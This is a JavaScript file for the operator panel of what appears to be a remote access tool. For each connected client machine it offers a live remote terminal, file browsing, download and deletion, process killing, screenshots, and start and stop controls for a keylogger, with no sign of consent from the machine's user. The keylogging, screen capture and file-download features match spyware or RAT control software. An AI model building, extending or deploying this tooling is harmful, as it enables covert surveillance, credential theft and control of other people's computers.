// Client Details JavaScript - Extracted from client-details.html

let clientId = null;
let currentClient = null;
let drivesCache = null;

// Get client ID from URL
function getClientId() {
    const params = new URLSearchParams(window.location.search);
    return params.get('id');
}

// Switch tabs
function switchTab(tabName) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
    
    document.getElementById(tabName).classList.add('active');
    event.target.classList.add('active');
    
    // Load data when switching to specific tabs
    if (tabName === 'processes') {
        loadProcesses();
    } else if (tabName === 'files') {
        ensureFileBrowserDefaults();
        browseFolder();
    } else if (tabName === 'info') {
        loadSystemInfo();
    } else if (tabName === 'terminal') {
        // Auto-connect to terminal when tab is activated
        if (!terminalConnected) {
            setTimeout(connectTerminal, 100);
        }
        // Focus the terminal input
        setTimeout(() => {
            const terminalInput = document.getElementById('terminalInput');
            if (terminalInput) terminalInput.focus();
        }, 200);
    }
}

// Load client details
async function loadClientDetails() {
    clientId = getClientId();
    if (!clientId) {
        window.location.href = '/dashboard-new';
        return;
    }

    try {
        const response = await fetch(`/api/client?id=${encodeURIComponent(clientId)}`, {
            credentials: 'include'
        });
        if (!response.ok) throw new Error('Failed to load client');
        
        const raw = await response.json();
        // Normalize structure: some responses are ClientMetadata, some are Client{Metadata: {...}}
        if (raw && raw.Metadata) {
            currentClient = { ...raw.Metadata };
            // Preserve id if not present
            if (!currentClient.id && raw.ID) currentClient.id = raw.ID;
            if (!currentClient.status && raw.Metadata.status) currentClient.status = raw.Metadata.status;
        } else {
            currentClient = raw;
        }
        updateClientDisplay();
    } catch (err) {
        console.error('Error loading client:', err);
        showStatus('Error', 'Failed to load client details');
    }
}

function updateClientDisplay() {
    document.getElementById('clientName').textContent = currentClient.hostname || currentClient.id;
    document.getElementById('clientStatus').textContent = currentClient.status === 'online' ? 'Online' : 'Offline';
    document.getElementById('statusIndicator').className = `status-indicator ${currentClient.status}`;

    // Update system info
    document.getElementById('hostname').textContent = currentClient.hostname || '-';
    document.getElementById('osInfo').textContent = `${currentClient.os || '-'} ${currentClient.arch || ''}`;
    document.getElementById('arch').textContent = currentClient.arch || '-';
    document.getElementById('cpuCount').textContent = currentClient.cpu_count || '-';
    document.getElementById('localIp').textContent = currentClient.ip || '-';
    document.getElementById('publicIp').textContent = currentClient.public_ip || '-';
    document.getElementById('connected').textContent = currentClient.status;
    document.getElementById('lastSync').textContent = currentClient.last_seen ? new Date(currentClient.last_seen).toLocaleString() : '-';

    ensureFileBrowserDefaults();
    
    // Load system info for overview stats
    loadSystemInfoForOverview();
}

async function loadSystemInfoForOverview() {
    try {
        const response = await fetch(`/api/system-info?client_id=${encodeURIComponent(clientId)}`, {
            credentials: 'include'
        });
        if (!response.ok) {
            console.warn('Failed to load system info');
            return;
        }
        
        const info = await response.json();
        updateOverviewStats(info);
    } catch (err) {
        console.error('Error loading system info:', err);
    }
}

function updateOverviewStats(info) {
    // Update CPU Usage (if available from process stats, otherwise show core count)
    document.getElementById('cpuCount').textContent = info.cpu_count || '-';
    
    // Update Memory Usage
    document.getElementById('memUsage').textContent = `${(info.memory_percent || 0).toFixed(1)}%`;
    document.getElementById('memDetail').textContent = `${formatBytes(info.used_memory || 0)} / ${formatBytes(info.total_memory || 0)}`;
    
    // Update Disk Usage
    document.getElementById('diskUsage').textContent = `${(info.disk_percent || 0).toFixed(1)}%`;
    document.getElementById('diskDetail').textContent = `${formatBytes(info.disk_used || 0)} / ${formatBytes(info.disk_total || 0)}`;
    
    // Update Uptime
    const uptimeHours = Math.floor((info.uptime || 0) / 3600);
    const uptimeDays = Math.floor(uptimeHours / 24);
    const uptimeDisplay = uptimeDays > 0 ? `${uptimeDays}d ${uptimeHours % 24}h` : `${uptimeHours}h`;
    document.getElementById('uptime').textContent = uptimeDisplay;
    document.getElementById('uptimeDetail').textContent = new Date(Date.now() - (info.uptime || 0) * 1000).toLocaleDateString();
}

// File browser functions
function browseFolder() {
    ensureFileBrowserDefaults();
    const path = document.getElementById('filePath').value || getDefaultPath();
    loadFiles(path);
}

function ensureFileBrowserDefaults() {
    const isWindows = isWindowsClient();
    if (isWindows) {
        document.getElementById('drivesBtn').style.display = 'inline-flex';
        if (!drivesCache) loadDrives();
    }
    const pathInput = document.getElementById('filePath');
    if (pathInput && !pathInput.value) {
        pathInput.value = getDefaultPath();
    }
}

function getDefaultPath() {
    const os = currentClient && currentClient.os ? currentClient.os.toLowerCase() : '';
    return os.includes('windows') ? 'C:\\' : '/';
}

function isWindowsClient() {
    const os = currentClient && currentClient.os ? currentClient.os.toLowerCase() : '';
    return os.includes('windows');
}

async function loadFiles(path) {
    try {
        const response = await fetch(`/api/files/browse`, {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                client_id: clientId,
                path: path
            })
        });
        if (!response.ok) throw new Error('Failed to load files');
        
        const data = await response.json() || {};
        // Handle both array and object responses
        const files = Array.isArray(data) ? data : (data.files || []);
        renderFileList(files, path);
    } catch (err) {
        console.error('Error loading files:', err);
        document.getElementById('fileTableBody').innerHTML = 
            `<tr><td colspan="4" style="text-align: center; color: red;">Error loading files: ${err.message}</td></tr>`;
    }
}

async function loadDrives() {
    if (!isWindowsClient()) return;

    try {
        const response = await fetch('/api/files/drives', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ client_id: clientId })
        });

        if (!response.ok) throw new Error('Failed to get drives');

        const result = await response.json();
        drivesCache = result.drives || [];
    } catch (err) {
        console.error('Error loading drives:', err);
        drivesCache = [];
    }
}

function toggleDrives() {
    if (!isWindowsClient()) return;

    const panel = document.getElementById('drivesPanel');
    const list = document.getElementById('drivesList');
    const isVisible = panel.style.display !== 'none';

    if (!isVisible && (!drivesCache || drivesCache.length === 0)) {
        list.innerHTML = '<div style="text-align: center; padding: 12px; color: var(--text-light);">No drives found</div>';
    }

    panel.style.display = isVisible ? 'none' : 'block';

    if (panel.style.display === 'block' && drivesCache && drivesCache.length) {
        list.innerHTML = drivesCache.map(drive => {
            const encodedPath = encodeURIComponent(drive.name || '');
            return `
                <div class="file-card" style="background: #151826; border: 1px solid #1f2230; border-radius: 10px; padding: 10px; cursor: pointer;" onclick="browseDrive('${encodedPath}')">
                    <div style="font-weight: 600; color: #fff;">💾 ${escapeHtml(drive.name)}</div>
                    <div style="color: var(--text-light); font-size: 12px;">${escapeHtml(drive.label || 'Local Disk')}</div>
                    <div style="color: var(--text-muted); font-size: 12px; margin-top: 6px;">${drive.type} | ${formatBytes(drive.free_size)} free of ${formatBytes(drive.total_size)}</div>
                </div>
            `;
        }).join('');
    }
}

function browseDrive(encodedPath) {
    const path = decodePathValue(encodedPath);
    const pathInput = document.getElementById('filePath');
    pathInput.value = path;
    loadFiles(path);
}

function renderFileList(files, currentPath) {
    const tbody = document.getElementById('fileTableBody');
    if (!files || files.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" style="text-align: center;">No files found</td></tr>';
        return;
    }

    tbody.innerHTML = files.map(file => {
        const encodedPath = encodeURIComponent(file.path || '');
        const modified = file.modified ? new Date(file.modified).toLocaleString() : '';
        return `
        <tr>
            <td><span class="file-icon">${file.is_dir ? '📁' : '📄'}</span>
                <span class="file-name" onclick="handleFileClick('${encodedPath}')">${escapeHtml(file.name)}</span>
            </td>
            <td>${formatBytes(file.size)}</td>
            <td>${modified}</td>
            <td>
                <button class="btn btn-small btn-primary" onclick="downloadFile('${encodedPath}')">Download</button>
                <button class="btn btn-small btn-secondary" onclick="deleteFile('${encodedPath}')">Delete</button>
            </td>
        </tr>
        `;
    }).join('');
}

function handleFileClick(encodedPath) {
    const path = decodePathValue(encodedPath);
    document.getElementById('filePath').value = path;
    loadFiles(path);
}

function downloadFile(encodedPath) {
    const path = decodePathValue(encodedPath);
    window.location.href = `/api/files/download?client_id=${encodeURIComponent(clientId)}&path=${encodeURIComponent(path)}`;
}

async function deleteFile(encodedPath) {
    const path = decodePathValue(encodedPath);
    if (confirm(`Delete ${path}?`)) {
        try {
            const response = await fetch(`/api/files/delete`, {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    client_id: clientId,
                    path: path
                })
            });
            if (response.ok) {
                showStatus('Deleted', `File deleted: ${path}`);
                browseFolder();
            } else {
                showStatus('Error', 'Failed to delete file');
            }
        } catch (err) {
            showStatus('Error', err.message);
        }
    }
}

function uploadFile() {
    showStatus('Upload', 'File upload dialog would appear here');
}

function refreshFiles() {
    browseFolder();
}

// Terminal functions
let terminalWs = null;
let terminalConnected = false;
let commandHistory = [];
let historyIndex = -1;

function connectTerminal() {
    if (terminalWs && terminalWs.readyState === WebSocket.OPEN) {
        return; // Already connected
    }

    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/api/terminal?client=${encodeURIComponent(clientId)}`;
    
    updateTerminalStatus('Connecting...', '#ffc107');
    terminalWs = new WebSocket(wsUrl);
    
    terminalWs.onopen = () => {
        terminalConnected = true;
        updateTerminalStatus('Connected', '#28a745');
        addTerminalOutput('Connected to terminal session', 'success');
    };
    
    terminalWs.onmessage = (event) => {
        const data = JSON.parse(event.data);
        
        if (data.type === 'output') {
            addTerminalOutput(data.data);
        } else if (data.type === 'error') {
            addTerminalOutput(data.data, 'error');
        } else if (data.type === 'exit') {
            addTerminalOutput(`Process exited with code ${data.code}`, 'info');
        }
    };
    
    terminalWs.onerror = (error) => {
        addTerminalOutput('WebSocket error occurred', 'error');
        console.error('WebSocket error:', error);
        terminalConnected = false;
        updateTerminalStatus('Error', '#dc3545');
    };
    
    terminalWs.onclose = () => {
        terminalConnected = false;
        updateTerminalStatus('Disconnected', '#dc3545');
        addTerminalOutput('Disconnected from terminal session', 'error');
        setTimeout(() => {
            if (document.getElementById('terminal').style.display !== 'none') {
                addTerminalOutput('Attempting to reconnect...', 'info');
                connectTerminal();
            }
        }, 3000);
    };
}

function updateTerminalStatus(text, color) {
    const statusEl = document.getElementById('terminalStatus');
    if (statusEl) {
        statusEl.textContent = text;
        statusEl.style.color = color;
    }
}

function addTerminalOutput(text, className = '') {
    const output = document.getElementById('terminalOutput');
    const line = document.createElement('div');
    line.className = `terminal-line ${className}`;
    
    if (className === 'success') {
        line.style.color = '#4ade80';
    } else if (className === 'error') {
        line.style.color = '#f87171';
    } else if (className === 'info') {
        line.style.color = '#75beff';
    }
    
    line.textContent = text;
    output.appendChild(line);
    output.scrollTop = output.scrollHeight;
}

function executeTerminalCommand() {
    const input = document.getElementById('terminalInput');
    const command = input.value.trim();
    
    if (!command) return;

    if (!terminalWs || terminalWs.readyState !== WebSocket.OPEN) {
        addTerminalOutput('Not connected to server', 'error');
        return;
    }
    
    addTerminalOutput(`$ ${command}`, 'info');
    terminalWs.send(JSON.stringify({
        type: 'input',
        data: command + '\n'
    }));
    
    commandHistory.unshift(command);
    if (commandHistory.length > 100) {
        commandHistory.pop();
    }
    historyIndex = -1;
    input.value = '';
}

function clearTerminal() {
    const output = document.getElementById('terminalOutput');
    output.innerHTML = '';
    addTerminalOutput('Terminal cleared', 'info');
}

function disconnectTerminal() {
    if (terminalWs) {
        terminalWs.close();
        terminalWs = null;
        terminalConnected = false;
        updateTerminalStatus('Disconnected', '#dc3545');
        addTerminalOutput('Terminal disconnected by user', 'info');
    }
}

// Process management
async function loadProcesses() {
    const container = document.getElementById('processListContainer');
    container.innerHTML = '<div style="text-align: center; padding: 40px; color: var(--text-light);">Loading processes...</div>';
    
    try {
        const response = await fetch(`/api/processes?client_id=${encodeURIComponent(clientId)}`, {
            credentials: 'include'
        });
        if (!response.ok) {
            const err = await response.text();
            throw new Error(err || 'Failed to load processes');
        }
        
        const processes = await response.json();
        renderProcessList(Array.isArray(processes) ? processes : []);
    } catch (err) {
        console.error('Error loading processes:', err);
        container.innerHTML = `<div style="text-align: center; padding: 40px; color: #f00;">Error: ${escapeHtml(err.message)}</div>`;
    }
}

function renderProcessList(processes) {
    const container = document.getElementById('processListContainer');
    if (!processes || processes.length === 0) {
        container.innerHTML = '<div style="text-align: center; padding: 40px;">No processes found</div>';
        return;
    }

    container.innerHTML = processes.slice(0, 20).map(proc => `
        <div class="process-item">
            <div>
                <div class="process-name">${escapeHtml(proc.name)}</div>
                <div class="process-pid">PID: ${proc.pid}</div>
            </div>
            <div><div class="cpu-bar"><div class="cpu-fill" style="width: ${proc.cpu}%"></div></div>${proc.cpu}%</div>
            <div><div class="mem-bar"><div class="mem-fill" style="width: ${proc.memory}%"></div></div>${proc.memory}%</div>
            <div>${proc.status}</div>
            <button class="kill-btn" onclick="killProcess(${proc.pid})">Kill</button>
        </div>
    `).join('');
}

function refreshProcesses() {
    loadProcesses();
}

async function loadSystemInfo() {
    try {
        const response = await fetch(`/api/system-info?client_id=${encodeURIComponent(clientId)}`, {
            credentials: 'include'
        });
        if (!response.ok) {
            const err = await response.text();
            throw new Error(err || 'Failed to load system info');
        }
        
        const info = await response.json();
        renderSystemInfo(info);
    } catch (err) {
        console.error('Error loading system info:', err);
        showStatus('Error', `Failed to load system info: ${err.message}`);
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function renderSystemInfo(info) {
    // System Information section
    document.getElementById('info_hostname').textContent = info.hostname || '-';
    document.getElementById('info_os').textContent = info.os || '-';
    document.getElementById('info_arch').textContent = info.arch || '-';
    document.getElementById('info_cpuCores').textContent = info.cpu_count || '-';
    
    // Add uptime display
    const uptimeHours = Math.floor((info.uptime || 0) / 3600);
    const uptimeDays = Math.floor(uptimeHours / 24);
    const uptimeDisplay = uptimeDays > 0 ? `${uptimeDays}d ${uptimeHours % 24}h` : `${uptimeHours}h`;
    document.getElementById('info_uptime').textContent = uptimeDisplay;
    
    // Memory section
    document.getElementById('info_totalMem').textContent = formatBytes(info.total_memory || 0);
    document.getElementById('info_availMem').textContent = formatBytes(info.avail_memory || 0);
    document.getElementById('info_usedMem').textContent = formatBytes(info.used_memory || 0);
    document.getElementById('info_memPercent').textContent = `${(info.memory_percent || 0).toFixed(1)}%`;
    
    // Disk section
    document.getElementById('info_diskTotal').textContent = formatBytes(info.disk_total || 0);
    document.getElementById('info_diskUsed').textContent = formatBytes(info.disk_used || 0);
    document.getElementById('info_diskFree').textContent = formatBytes(info.disk_free || 0);
    document.getElementById('info_diskPercent').textContent = `${(info.disk_percent || 0).toFixed(1)}%`;
}

function killProcess(pid) {
    if (confirm(`Kill process ${pid}?`)) {
        fetch(`/api/command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                client_id: clientId,
                command: {
                    command: 'kill',
                    args: [String(pid)],
                    timeout: 10
                }
            })
        }).then(resp => {
            if (resp.ok) {
                showStatus('Killed', `Process ${pid} terminated`);
                refreshProcesses();
            } else {
                showStatus('Error', 'Failed to kill process');
            }
        }).catch(err => showStatus('Error', err.message));
    }
}

// Keylogger state
let keyloggerActive = false;

// Actions
async function executeAction(action) {
    if (action === 'screenshot') {
        await handleScreenshot();
        return;
    }

    if (action === 'keylogger') {
        await handleKeylogger();
        return;
    }

    showStatus('Error', 'Unknown action');
}

// Handle keylogger start/stop
async function handleKeylogger() {
    try {
        if (keyloggerActive) {
            // Stop keylogger
            const response = await fetch('/api/keylogger/stop', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: clientId }),
                credentials: 'include'
            });

            if (!response.ok) {
                showStatus('Error', `Failed to stop keylogger: ${response.statusText}`);
                return;
            }

            keyloggerActive = false;
            updateKeyloggerUI();
            showStatus('Success', 'Keylogger stopped');
        } else {
            // Start keylogger
            const response = await fetch('/api/keylogger/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: clientId }),
                credentials: 'include'
            });

            if (!response.ok) {
                showStatus('Error', `Failed to start keylogger: ${response.statusText}`);
                return;
            }

            keyloggerActive = true;
            updateKeyloggerUI();
            showStatus('Success', 'Keylogger started');
        }
    } catch (err) {
        showStatus('Error', `Keylogger error: ${err.message}`);
    }
}

// Update keylogger UI button and status
function updateKeyloggerUI() {
    const btn = document.getElementById('keyloggerBtn');
    const statusEl = document.getElementById('keyloggerStatus');

    if (keyloggerActive) {
        btn.textContent = '⌨️ Stop Keylogger';
        btn.classList.remove('btn-secondary');
        btn.classList.add('btn-danger');
        statusEl.textContent = 'Running';
        statusEl.style.color = 'var(--success)';
    } else {
        btn.textContent = '⌨️ Start Keylogger';
        btn.classList.remove('btn-danger');
        btn.classList.add('btn-secondary');
        statusEl.textContent = 'Stopped';
        statusEl.style.color = 'var(--danger)';
    }
}

// Handle screenshot action
async function handleScreenshot() {
    try {
        showStatus('Screenshot', 'Taking screenshot...');
        
        const response = await fetch(`/api/screenshot?client_id=${encodeURIComponent(clientId)}`, {
            method: 'GET',
            credentials: 'include'
        });

        if (!response.ok) {
            showStatus('Error', `Screenshot failed: ${response.statusText}`);
            return;
        }

        const data = await response.json();
        
        if (data.error) {
            showStatus('Error', `Screenshot error: ${data.error}`);
            return;
        }

        // Display screenshot
        if (data.data && data.width && data.height) {
            showScreenshotModal(data);
            showStatus('Success', 'Screenshot taken');
        } else {
            showStatus('Error', 'Invalid screenshot data received');
        }
    } catch (err) {
        showStatus('Error', `Screenshot failed: ${err.message}`);
    }
}

// Show screenshot in modal
function showScreenshotModal(screenshotData) {
    const modal = document.createElement('div');
    modal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.9);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10000;
        cursor: pointer;
    `;

    const content = document.createElement('div');
    content.style.cssText = `
        background: white;
        border-radius: 8px;
        padding: 20px;
        max-width: 90vw;
        max-height: 90vh;
        overflow: auto;
        box-shadow: 0 4px 20px rgba(0,0,0,0.3);
    `;

    const closeBtn = document.createElement('button');
    closeBtn.textContent = '✕ Close';
    closeBtn.style.cssText = `
        position: absolute;
        top: 10px;
        right: 10px;
        background: #dc3545;
        color: white;
        border: none;
        padding: 8px 16px;
        border-radius: 4px;
        cursor: pointer;
        font-weight: 600;
    `;
    closeBtn.onclick = () => modal.remove();

    const title = document.createElement('h3');
    title.textContent = `Screenshot (${screenshotData.width}x${screenshotData.height})`;
    title.style.marginBottom = '15px';

    const imgContainer = document.createElement('div');
    imgContainer.style.textAlign = 'center';

    const img = document.createElement('img');
    
    // Convert base64 to image data
    if (typeof screenshotData.data === 'string') {
        img.src = `data:image/${screenshotData.format || 'png'};base64,${screenshotData.data}`;
    } else if (Array.isArray(screenshotData.data)) {
        // Convert byte array to base64
        const binary = String.fromCharCode.apply(null, screenshotData.data);
        const base64 = btoa(binary);
        img.src = `data:image/${screenshotData.format || 'png'};base64,${base64}`;
    }
    
    img.style.cssText = `
        max-width: 100%;
        max-height: 70vh;
        border-radius: 4px;
    `;

    imgContainer.appendChild(img);
    content.appendChild(title);
    content.appendChild(imgContainer);
    content.appendChild(closeBtn);
    modal.appendChild(content);
    modal.onclick = (e) => {
        if (e.target === modal) modal.remove();
    };

    document.body.appendChild(modal);
}

// Utility functions
function decodePathValue(value) {
    if (typeof value !== 'string') return '';
    try {
        return decodeURIComponent(value);
    } catch (err) {
        console.warn('Failed to decode path value', value, err);
        return value;
    }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function showStatus(title, message) {
    document.getElementById('modalTitle').textContent = title;
    document.getElementById('modalMessage').textContent = message;
    document.getElementById('statusModal').classList.add('active');
}

function closeModal() {
    document.getElementById('statusModal').classList.remove('active');
}

// Initialize
window.addEventListener('DOMContentLoaded', () => {
    loadClientDetails();
    setInterval(() => {
        if (currentClient && currentClient.status === 'online') {
            updateClientDisplay();
        }
    }, 5000);

    // Set up terminal keyboard navigation
    const terminalInput = document.getElementById('terminalInput');
    if (terminalInput) {
        terminalInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                executeTerminalCommand();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    terminalInput.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    terminalInput.value = commandHistory[historyIndex];
                } else {
                    historyIndex = -1;
                    terminalInput.value = '';
                }
            }
        });
    }
});
